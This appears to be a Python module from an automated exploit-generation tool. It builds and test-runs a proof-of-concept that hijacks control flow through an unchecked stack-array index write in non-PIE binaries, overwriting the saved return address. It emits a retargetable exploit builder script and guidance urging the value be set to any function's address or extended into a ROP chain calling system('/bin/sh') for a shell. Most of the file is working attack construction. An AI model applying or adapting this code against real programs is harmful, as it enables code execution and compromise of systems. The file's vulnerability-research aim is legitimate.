"""doc 58: construct a control-flow-hijack PoC for an unchecked-index STACK-array write (CWE-787/129).

The classic shape the menu-oriented chain_primitive._oob_write_hijack misses: a stack array
`arr[idx] = val` with an attacker-controlled index and a RAW (binary) read input. `arr_base +
idx*stride` lands on the saved return address -- a CONSTANT stack-relative offset, so the index is
ASLR-independent -- and `val = &win` redirects control when the function returns. We find the index
by a small neighborhood search and CONFIRM by detonation: the win breakpoint is hit with our value
AND a benign value does NOT hit it (so the overwrite, not incidental flow, caused arrival).

Non-PIE only (win is a file vaddr); a PIE indexed write needs a leak first (honest: left as a recipe).
"""
from __future__ import annotations

import logging
import struct

from ... import observe

_log = logging.getLogger(__name__)

#: element stride by C base type (the array index is scaled by this).
_ELEM = {"char": 1, "unsigned char": 1, "signed char": 1, "short": 2, "unsigned short": 2,
         "int": 4, "unsigned int": 4, "long": 8, "long int": 8, "unsigned long": 8,
         "long long": 8, "size_t": 8, "ssize_t": 8, "void *": 8}


def _stride(vartype: str) -> int:
    base = (vartype or "").split("[")[0].replace("*", "").strip()
    return _ELEM.get(base, 8)


def _buffer_var(frame):
    """The array buffer local in a frame (largest is_buffer var), or None."""
    if not frame:
        return None
    bufs = [v for v in (frame.get("vars") or []) if isinstance(v, dict) and v.get("is_buffer")
            and "[" in str(v.get("type", ""))]
    if not bufs:
        bufs = [v for v in (frame.get("vars") or []) if isinstance(v, dict) and v.get("is_buffer")]
    return max(bufs, key=lambda v: int(v.get("size") or 0)) if bufs else None


#: raw-binary input encodings to try: the program reads the index and the value as 8-byte LE words.
_ENCODINGS = [
    ("idx,val", lambda i, v: struct.pack("<qq", i, v)),
    ("val,idx", lambda i, v: struct.pack("<qq", v, i)),
]


def _hijack(detonate, exe, buf_off, stride, win_addr):
    """Find the (index, payload, encoding) that overwrites the saved return address with &win,
    confirmed by detonation + a negative control. buf_off is the buffer's rbp-relative offset
    (negative); the return slot sits a few words above rbp. Returns a dict or None."""
    stride = stride if stride in (1, 2, 4, 8) else 8
    # candidate target offsets above rbp: the return address (+8/+16 with alignment) and saved rbp.
    centres = set()
    for toff in (8, 0, 16):
        if buf_off is not None:
            centres.add((toff - buf_off) // stride)
    base = sorted(centres) or list(range(1, 20))
    cands = []
    for c in base:
        for d in (0, 1, -1, 2, -2, 3):
            if c + d not in cands and c + d > 0:
                cands.append(c + d)
    attempts = 0
    for idx in cands:
        for ename, enc in _ENCODINGS:
            if attempts >= 80:
                return None
            attempts += 1
            payload = enc(idx, win_addr)
            if not detonate.reaches_address(exe, payload, win_addr, input_mode="stdin"):
                continue
            neg = enc(idx, win_addr ^ 0xFFFF)
            if detonate.reaches_address(exe, neg, win_addr, input_mode="stdin"):
                continue                                   # reached without our value -> incidental
            return {"idx": idx, "payload": payload, "enc": ename, "stride": stride}
    return None


def _oob_builder(binname, idx, win_addr, win_name, enc) -> list:
    """The retarget knobs + an editable builder for the oob-index-write, as evidence channels."""
    order = "struct.pack('<qq', WRITE_INDEX, WRITE_VALUE)" if enc == "idx,val" \
        else "struct.pack('<qq', WRITE_VALUE, WRITE_INDEX)"
    usage = (
        "WHAT IT IS — a tiny builder: it emits the raw bytes (index + value) the program reads, "
        "which overwrite the saved return address.\n"
        "WORKFLOW —\n"
        "1. Download the builder (`poc.py`) below.\n"
        "2. Build the payload: `python3 poc.py > poc.bin`.\n"
        f"3. Deliver it: `./{binname} < poc.bin` — control transfers to the chosen address.\n"
        f"ON SOURCE — build the source first (e.g. `gcc -o {binname} src.c`), then run the builder on "
        "the compiled binary. The Memory layout shows the array vs the return address."
    )
    guide = (
        f"This PoC overwrites the saved return address via the unchecked index: `arr[{idx}] = &{win_name}` "
        f"({win_addr:#x}). Edit these knobs in the builder below:\n"
        f"- WRITE VALUE ({win_addr:#x}) — where control jumps on return; set it to ANY function's address.\n"
        f"- WRITE INDEX ({idx}) — the array index that lands on the return slot (found by search + "
        "detonation; stable for this binary).\n"
        "- RCE / shell — a single 8-byte write to the return address reaches a one-gadget directly; "
        "for a full shell, chain writes to lay a short ROP chain (pop rdi; &\"/bin/sh\"; system)."
    )
    script = (
        "#!/usr/bin/env python3\n"
        "# Out-of-bounds (unchecked-index) write -> control hijack. EDIT to retarget.\n"
        "import struct, sys\n\n"
        f"WRITE_INDEX = {idx}          # arr[WRITE_INDEX] lands on the saved return address\n"
        f"WRITE_VALUE = {win_addr:#x}   # where control jumps -- set to ANY function's address\n\n"
        f"sys.stdout.buffer.write({order})\n"
        f"# run:  python3 poc.py > poc.bin ;  ./{binname} < poc.bin\n"
    )
    return [{"channel": "builder-usage", "detail": usage},
            {"channel": "customize", "detail": guide},
            {"channel": "exploit-script", "detail": script}]


def construct_stack_oob_writes(ctx, target) -> list:
    """For each CWE-787/129 unchecked-index write whose function has a stack array, construct and
    DETONATE a return-address overwrite to win -> a poc-backed L3. Returns the filed finding ids."""
    from ...db.dao import FindingDAO, FunctionDAO
    from . import construct, detonate, elfstatic, exploit
    fids = []
    try:
        tb = ctx.content.path(target.sha256).read_bytes()
        if elfstatic.is_pie(tb):
            return []
        win = exploit.find_win(exploit.elf_functions(tb))
        if not (win and win[1]):
            return []
        win_name, win_addr = win[0], int(win[1])
        fd = FindingDAO(ctx.conn)
        leads = [f for f in fd.list_by_target(target.id)
                 if f.cwe in ("CWE-129", "CWE-787") and f.function_addr
                 and not (f.dedup_key or "").startswith("poc:")]
        if not leads:
            return []
        if any((f.dedup_key or "").startswith("poc:CWE-787:oob-write:") for f in fd.list_by_target(target.id)):
            return []                                      # already constructed
        # stage the binary (content store is non-exec)
        staged = ctx.scratch() / "oob-construct" / (getattr(target, "filename", None) or "target.bin")
        staged.parent.mkdir(parents=True, exist_ok=True)
        ctx.content.stage_target(target, staged.parent, staged.name)
        staged.chmod(0o755)
        exe = str(staged)
        fnd = FunctionDAO(ctx.conn)
        done_fn = set()
        for lead in leads:
            fa = lead.function_addr
            if fa in done_fn:
                continue
            done_fn.add(fa)
            frame = _frame_at(fnd, target.id, fa)
            bv = _buffer_var(frame)
            buf_off = int(bv["offset"]) if bv and bv.get("offset") is not None else None
            stride = _stride(bv.get("type")) if bv else 8
            res = _hijack(detonate, exe, buf_off, stride, win_addr)
            if not res:
                continue
            idx, payload = res["idx"], res["payload"]
            binname = getattr(target, "filename", None) or "./target"
            soundness = [
                "unchecked array index: arr[idx] = value writes outside the array with no bound "
                "check on idx (the CWE-787/129 site)",
                f"index {idx} overwrites the saved return address: arr_base + {idx}*{res['stride']} "
                "lands on the return slot -- a constant stack-relative offset, ASLR-independent",
                f"value = &{win_name} ({win_addr:#x}) -- control redirects to {win_name} on return",
                "no stack canary: an indexed stack write to the return address is not guarded",
                f"DETONATED: control reached {win_name} ({win_addr:#x}) with this value; a benign "
                "value does NOT reach it (the overwrite, not incidental flow, caused arrival)",
            ]
            reproduce = (
                f"# CWE-787 out-of-bounds write -> control hijack ({win_name})\n"
                f"# arr[{idx}] = &{win_name} ({win_addr:#x}) overwrites the saved return address.\n"
                f"# payload = raw bytes ({len(payload)}); the attached poc-input artifact. save as poc.bin\n"
                f"{binname} < poc.bin"
            )
            fid = construct.record_constructed_poc(
                ctx, target, cwe="CWE-787",
                technique="oob-index-write -> return-address overwrite", level="L3",
                payload=payload, soundness=soundness, reproduce=reproduce, input_mode="stdin",
                detector="oob_construct", dedup_key=f"poc:CWE-787:oob-write:{fa}:{target.id}",
                title=f"Out-of-bounds write -> control hijack ({win_name}) at {fa}",
                summary=f"arr[{idx}] := &{win_name} ({win_addr:#x}) over the saved return address; "
                        "control reach confirmed by detonation",
                lead=lead, detonated=True,
                signal_name=f"control reached {win_name} ({win_addr:#x})",
                function_addr=fa, site_addr=lead.site_addr,
                extra_evidence=_oob_builder(binname, idx, win_addr, win_name, res["enc"]))
            if fid:
                fids.append(fid)
    except Exception:                                      # noqa: BLE001 -- best-effort
        observe.absorbed(_log, "stack-oob construct failed")
    return fids


def _frame_at(fnd, target_id, faddr):
    try:
        want = int(faddr, 16) if isinstance(faddr, str) else int(faddr)
    except (TypeError, ValueError):
        return None
    for f in fnd.list_by_target(target_id):
        try:
            a = int(f.addr, 16) if isinstance(f.addr, str) else int(f.addr)
        except (TypeError, ValueError):
            continue
        if a == want:
            full = fnd.get(f.id)
            return getattr(full, "frame", None) if full else None
    return None
